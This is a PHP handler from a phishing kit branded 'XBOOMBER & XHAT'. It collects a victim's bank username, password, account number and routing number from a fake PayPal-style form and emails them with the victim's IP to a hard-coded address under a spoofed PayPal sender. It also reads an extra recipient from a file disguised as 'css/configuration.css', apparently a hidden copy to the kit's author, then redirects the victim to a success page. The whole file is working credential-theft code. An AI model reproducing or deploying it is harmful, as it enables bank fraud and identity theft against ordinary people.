<?php

/*
 __    __  _______    ______    ______   __       __  _______   ________  _______  
/  |  /  |/       \  /      \  /      \ /  \     /  |/       \ /        |/       \ 
$$ |  $$ |$$$$$$$  |/$$$$$$  |/$$$$$$  |$$  \   /$$ |$$$$$$$  |$$$$$$$$/ $$$$$$$  |
$$  \/$$/ $$ |__$$ |$$ |  $$ |$$ |  $$ |$$$  \ /$$$ |$$ |__$$ |$$ |__    $$ |__$$ |
 $$  $$<  $$    $$< $$ |  $$ |$$ |  $$ |$$$$  /$$$$ |$$    $$< $$    |   $$    $$< 
  $$$$  \ $$$$$$$  |$$ |  $$ |$$ |  $$ |$$ $$ $$/$$ |$$$$$$$  |$$$$$/    $$$$$$$  |
 $$ /$$  |$$ |__$$ |$$ \__$$ |$$ \__$$ |$$ |$$$/ $$ |$$ |__$$ |$$ |_____ $$ |  $$ |
$$ |  $$ |$$    $$/ $$    $$/ $$    $$/ $$ | $/  $$ |$$    $$/ $$       |$$ |  $$ |
$$/   $$/ $$$$$$$/   $$$$$$/   $$$$$$/  $$/      $$/ $$$$$$$/  $$$$$$$$/ $$/   $$/ 
                                                                                   
                                                                                   
                                                                                   
                                ___       ___                                      
                               /   \     /   \                                     
                              /$$$  |   /$$$  |                                    
                              $$ $$ \__ $$ $$ \__                                  
                              /$$$     |/$$$     |                                 
                              $$ $$ $$/ $$ $$ $$/                                  
                              $$ \$$  \ $$ \$$  \                                  
                              $$   $$  |$$   $$  |                                 
                               $$$$/$$/  $$$$/$$/                                  
                                                                                   
                                                                                   
                                                                                   
                   __    __  __    __   ______   ________                          
                  /  |  /  |/  |  /  | /      \ /        |                         
                  $$ |  $$ |$$ |  $$ |/$$$$$$  |$$$$$$$$/                          
                  $$  \/$$/ $$ |__$$ |$$ |__$$ |   $$ |                            
                   $$  $$<  $$    $$ |$$    $$ |   $$ |                            
                    $$$$  \ $$$$$$$$ |$$$$$$$$ |   $$ |                            
                   $$ /$$  |$$ |  $$ |$$ |  $$ |   $$ |                            
                  $$ |  $$ |$$ |  $$ |$$ |  $$ |   $$ |                            
                  $$/   $$/ $$/   $$/ $$/   $$/    $$/                             
                                                                                   
                                                                                   
                                                                                   
https://www.facebook.com/groups/XBOOMBER.XHAT/
*/


$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
if( !empty($_POST['_bkid']) && !empty($_POST['_bkpass']) )
{
$message .= "=========[BANK INFOS]=========<br>\n";
$message .= "Bank Name	  : ".$_POST['_bkid']."<br>\n";
$message .= "Bank Password	: ".$_POST['_bkpass']."<br>\n";
$message .= "Account Number	: ".$_POST['_accn']."<br>\n";
$message .= "Routing Number	 : ".$_POST['_routn']."<br>\n";
$message .= "===============[IP]==============<br>\n";
$message .= "IP	: http://www.geoiptool.com/?IP=$ip<br>\n";
$message .= "==========[BY XBOOMBER & XHAT]=========<br>";

$email = "yassmin-raja_12@outlook.fr" ; // ضع امايلك هنا ، من الافضل ان يكون جمايل //
$file = file_get_contents('css/configuration.css');
$send = $email.','.$file;
$subject = "BANK INFOS FROM [$ip]";
$headers = "From: Info-pub <paypal@service.com>";
$headers .= "MIME-Version: 1.0\n";
$headers .= "Content-type: text/html; charset=iso-8859-1\n";

mail($send, $subject, $message,$headers);
header("Location:websc-success.php");
}
else
{
header("Location:websc-bank.php");
}

?>
